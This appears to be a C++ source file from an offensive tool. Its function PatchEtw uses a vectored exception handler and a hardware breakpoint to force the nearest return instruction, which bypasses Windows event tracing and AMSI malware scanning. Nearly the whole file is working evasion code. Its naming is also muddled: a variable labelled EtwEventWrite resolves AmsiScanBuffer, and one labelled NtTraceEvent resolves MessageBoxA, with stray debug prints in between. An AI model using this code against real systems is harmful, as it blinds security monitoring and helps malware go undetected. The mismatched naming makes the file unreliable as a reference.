#include "hwbp_veh.h"
#include <iostream>

PVOID FindOpcode(PVOID pAddress, BYTE opcode, DWORD dwLengthSearch)
{
    for (DWORD i = 0; i < dwLengthSearch; i++)
    {
        if (*((BYTE*)pAddress + i) == opcode)
        {
            return (PVOID)((BYTE*)pAddress + i);
        }
    }

    return NULL;
}

LONG WINAPI ExceptionHandler(PEXCEPTION_POINTERS ExceptionInfo) {
    if (ExceptionInfo->ExceptionRecord->ExceptionCode == STATUS_SINGLE_STEP)
    {
        PVOID ret = FindOpcode((PVOID)ExceptionInfo->ContextRecord->Rip, 0xC3, 10000);
        if (ret) {
            std::cout << "Found ret at: " << ret << std::endl;
            ExceptionInfo->ContextRecord->Rip = (DWORD64)ret;
            ExceptionInfo->ContextRecord->EFlags |= (1 << 16);
            return EXCEPTION_CONTINUE_EXECUTION;
        }
    }

    return EXCEPTION_CONTINUE_SEARCH;
}

int PatchEtw() {
    AddVectoredExceptionHandler(1, ExceptionHandler);

    HMODULE hNtdll = LoadLibraryA("ntdll.dll");
    _EtwEventWrite pEtwEventWrite = (_EtwEventWrite)GetProcAddress(LoadLibraryA("amsi.dll"), "AmsiScanBuffer");
    if (!pEtwEventWrite) {
        PRINT_ERROR("EtwEventWrite");
        return 0;
    }
    std::cout << "1";
    _NtTraceEvent pNtTraceEvent = (_NtTraceEvent)GetProcAddress(LoadLibraryA("user32.dll"), "MessageBoxA");
    if (!pNtTraceEvent) {
        PRINT_ERROR("NtTraceEvent");
        return 0;
    }
    std::cout << "1";
    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    RtlCaptureContext(&ctx);
    std::cout << "1";
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    ctx.Dr0 = (DWORD64)pEtwEventWrite;
    ctx.Dr7 |= 1ull << (2 * 0);
    ctx.Dr7 &= ~(3ull << (16 + 4 * 0));
    ctx.Dr7 &= ~(3ull << (18 + 4 * 0));

    typedef NTSTATUS
    (NTAPI*
        _NtContinue)(
            _In_ PCONTEXT ContextRecord,
            _In_ BOOLEAN TestAlert
            );
    std::cout << "1";
    _NtContinue pNtContinue = (_NtContinue)GetProcAddress(hNtdll, "NtContinue");
    if (!pNtContinue) {
        PRINT_ERROR("NtContinue");
        return 0;
    }
    std::cout << "1";
    NTSTATUS ntStatus = pNtContinue(&ctx, FALSE);
    if (!NT_SUCCESS(ntStatus)) {
        std::cout << "NtContinue: " << GetLastError() << std::endl;
        return 0;
    }

    return 1;
}